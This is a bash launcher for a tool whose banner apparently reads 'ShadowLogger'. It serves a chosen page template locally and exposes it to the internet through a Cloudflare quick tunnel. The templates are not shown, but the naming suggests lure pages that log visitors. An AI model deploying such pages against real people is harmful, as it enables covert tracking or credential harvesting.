#!/bin/bash

# Colors
RED="\033[1;38;5;124m"
GRAY="\033[1;30m"
CYAN="\033[0;36m"
NC="\033[0m"

PORT=53142

if [ -f ./utils.js ]; then
    for dir in Templates/*; do
        mkdir -p "$dir/js"
        ln -sf ../../../utils.js "$dir/js/utils.js"
    done
fi

# ASCII Art Logo
echo -e "${RED}"
cat << "EOF"
 _____ _   _   ___ ______ _____  _    _ _     _____ _____ _____  ___________
/  ___| | | | / _ \|  _  \  _  || |  | | |   |  _  |  __ \  __ \|  ___| ___ \
\ `--.| |_| |/ /_\ \ | | | | | || |  | | |   | | | | |  \/ |  \/| |__ | |_/ /
 `--. \  _  ||  _  | | | | | | || |/\| | |   | | | | | __| | __ |  __||    /
/\__/ / | | || | | | |/ /\ \_/ /\  /\  / |___\ \_/ / |_\ \ |_\ \| |___| |\ \
\____/\_| |_/\_| |_/___/  \___/  \/  \/\_____/\___/ \____/\____/\____/\_| \_|
EOF

echo -e "${CYAN}                         Creator: armageddon-1${NC}\n"

# Step 0: Load templates from config

declare -A TEMPLATE_PATHS
declare -A TEMPLATE_DESC
count=1

BASE_DIR="Templates"

echo -e "${GRAY}[*] Available templates:${NC}"

# Loop through subfolders
while IFS= read -r -d '' folder; do
    CONFIG_FILE="$folder/config.ini"

    if [[ -f "$CONFIG_FILE" ]]; then
        NAME=""
        DESC=""

        # Parse INI fields safely
        while IFS='=' read -r key value; do
            case "$key" in
                name) NAME="$value" ;;
                description) DESC="$value" ;;
            esac
        done < <(grep -E "^(name|description)=" "$CONFIG_FILE")

        TEMPLATE_PATHS[$count]="$folder"
        TEMPLATE_DESC[$count]="$DESC"

        echo -e "[$count] $NAME - $DESC"

        ((count++))
    fi
done < <(find "$BASE_DIR" -mindepth 1 -maxdepth 1 -type d -print0)

echo
read -r -p "Enter number: " choice

if [[ -n "${TEMPLATE_PATHS[$choice]}" ]]; then
    TEMPLATE="${TEMPLATE_PATHS[$choice]}"
    echo -e "${GRAY}[*] You selected: ${CYAN}$TEMPLATE${NC}"
else
    echo -e "${RED}[!] Invalid choice.${NC}"
    exit 1
fi

# Step 1: Start Python HTTP server
echo -e "${GRAY}[*] Starting Python HTTP server on port $PORT...${NC}"
python3 -m http.server "$PORT" --directory "$TEMPLATE" > /dev/null 2>&1 &
PY_PID=$!
sleep 2

# Step 2: Start Cloudflared
echo -e "${GRAY}[*] Starting Cloudflared tunnel...${NC}"
TMP_LOG=$(mktemp)
cloudflared --url "http://0.0.0.0:$PORT" > "$TMP_LOG" 2>&1 &
CF_PID=$!

# Step 3: Wait for public URL
echo -e "${GRAY}[*] Waiting for tunnel to be created...${NC}"
for i in {1..20}; do
    PUBLIC_URL=$(grep -oE "https://[a-zA-Z0-9.-]+\.trycloudflare\.com" "$TMP_LOG" | head -n 1)
    if [[ -n "$PUBLIC_URL" ]]; then
        echo -e "${RED}[+] Tunnel live at: ${CYAN}$PUBLIC_URL${NC}"
        break
    fi
    sleep 1
done

if [[ -z "$PUBLIC_URL" ]]; then
    echo -e "${RED}[!] Failed to detect Cloudflared public URL.${NC}"
    kill $PY_PID $CF_PID
    rm -f $TMP_LOG
    exit 1
fi

# Step 4: Keep script alive until Ctrl+C
trap "echo -e '\n${RED}[!] Shutting down...${NC}'; kill $PY_PID $CF_PID; rm -f $TMP_LOG; exit" INT
wait
